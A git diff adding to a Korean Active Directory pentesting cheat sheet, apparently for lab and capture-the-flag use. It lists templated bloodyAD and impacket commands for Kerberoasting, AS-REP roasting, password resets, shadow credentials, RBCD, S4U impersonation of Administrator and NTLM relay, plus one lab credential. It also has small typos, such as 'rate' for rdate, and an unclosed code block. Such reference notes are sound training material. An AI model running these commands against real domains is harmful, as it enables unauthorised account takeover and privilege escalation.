@@ -1,6 +1,52 @@
-### REF.
+# 0. Start
+## 0.1. 마인드맵
 - https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
+- https://kypvas.github.io/ad_attack_architecture/
+- https://x.com/_nwodtuhs/
+## 0.2. "KRB_AP_ERR_SKEW(Clock skew too great)" 오류 해결
+### rdate
+```
+sudo rate -n <IP>
+```
+### faketime
+```
+faketime "$(ntpdate -q <IP> | cut -d ' ' -f 1,2)" <명령어>
 
+
+### 아니면 차이 나는 시간을 가지고 faketime 시간을 지정할 수도 있다.
+## Step 1. DC 현재 시간 확인
+ntpdate -q <IP>
+
+## Stpe 2. 시간차를 보정하여 명령어 실행
+faketime -f +7h <명령어>
+```
+## 0.3. kali 내 exe 파일 설치
+### chisel
+```
+## Step 1. 설치
+sudo apt install chisel-common-binaries
+
+## Step 2. 위치 확인
+chisel-common-binaries -h
+```
+### Rubeus
+```
+## Step 1. 설치
+sudo apt install rubeus
+
+## Step 2. 위치 확인
+rubeus -h
+```
+### winPEAS
+```
+## Step 1. 설치
+sudo apt install peass
+
+## Step 2. 위치 확인
+peass -h
+```
+### 그 외 바이너리
+- 경로 : /usr/share/windows-binaries
 
 # 1. 초기 접근
 ## 1.1. SMB
@@ -206,6 +252,16 @@ nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting kerberoast.hashes
 ### 🔨 impacket
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
 ```
+## 3.4. Pre-Windows 2000
+Pre-Windows 2000 Compatible Access 라는 보안 그룹이 있을 경우, 해당 컴퓨터 계정의 패스워드는 계정 이름의 소문자와 동일하다.
+```
+## Step 1. Pre-Windows 2000 식별
+nxc ldap <IP> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
+
+## Step 2. Change Password
+### SERVERDEMO$ 컴퓨터 계정의 암호는 serverdemo가 된다. 이를 통해 패스워드를 변경하자.
+impacket-changepasswd <DOMAIN>/'<COMPUTER>'@<IP> -newpass 'gotRoot!2' -p rpc-samr
+```
 
 # 4. Exploit
 ## 4.1. ADCS
@@ -218,4 +274,81 @@ certipy find -vulnerable -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <IP>
 
 ## Step 3. ADCS 취약점 exploit
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
+```
+## 4.2. SPN-
+
+
+# 99. Tool CheatSheet
+## BloodyAD
+https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad
+```
+## 설치
+sudo apt install bloodyad
+
+## 사용자 정보 조회 (ldap)
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object <TARGET_USERNAE>
+
+## 사용자를 특정 그룹에 추가
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember <GROUP_NAME> <TARGET_USERNAME>
+
+## 사용자 비밀번호 변경
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password <TARGET_USERNAME> <NEW_PASSWORD>
+
+## GMSAPassword 읽기
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object <TARGET_USERNAME> --attr msDS-ManagedPassword
+
+## Writable Attributes 조회
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> writable --detail
+
+## Shadow Credentials
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add shadowCredentials <TARGET_USERNAME>
+
+## WriteSPN
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <TARGET_USERNAME> servicePrincipalName -v 'domain/meow'
+
+## 삭제된 object 복원
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -k set restore <TARGET_USERNAME>
+
+## fake computer 생성
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer <COMPUTER_NAME> <COMPUTER_PASSWORD>
+
+## Resource Based Constrained Delegation 추가
+bloodyAD --host <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
+```
+## impacket
+```
+## AS-REP Roasting
+impacket-GetNPUsers <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request -usersfile users.txt
+
+## Kerberoasting
+impacket-GetUserSPNs <DOMAIN>/<USERNAME>:'<PASSWORD>' -dc-ip <IP> -request
+impacket-GetUserSPNs <DOMAIN>/<USERNAME> -k -no-pass -dc-ip <IP> -request
+
+## 패스워드 변경
+impacket-changepasswd <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP> -newpass '<NEW_PASSWORD>' -p rpc-samr
+
+## TGS 발급
+impacket-getST -spn '<SPN>' -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'
+
+## .kirbi -> .ccache 변경
+impacket-ticketConverter <kirbi_FIELNAME> <OUTPUT_FILENAME>
+
+## S4U
+impacket-getST -spn '<SPN>' -impersonate Administrator -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'
+
+### 예시
+impacket-getST -spn 'http/WEB01.pirate.htb' -impersonate Administrator -dc-ip ${htb_ip} 'pirate.htb/TCEXQYUI$:guUH_NpRfk<cY5i'
+
+## S4U + Service Name Substitution
+impacket-getST -spn '<SPN>' -impersonate Administrator -altservice '<ALT_SPN>' -dc-ip <IP> <DOMAIN>/<USERNAME>:'<PASSWORD>'
+
+## Winrm 접근
+impacket-wmiexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<IP>
+impacket-wmiexec -k -no-pass <IP>
+
+## ntlmrelay
+impacket-ntlmrelayx -t ldap://<IP> -smb2support --remove-mic
+
+## ntlmrelay + RBCD
+impacket-ntlmrelayx -t ldap://<IP> -smb2support --remove-mic --delegate-access
 ```
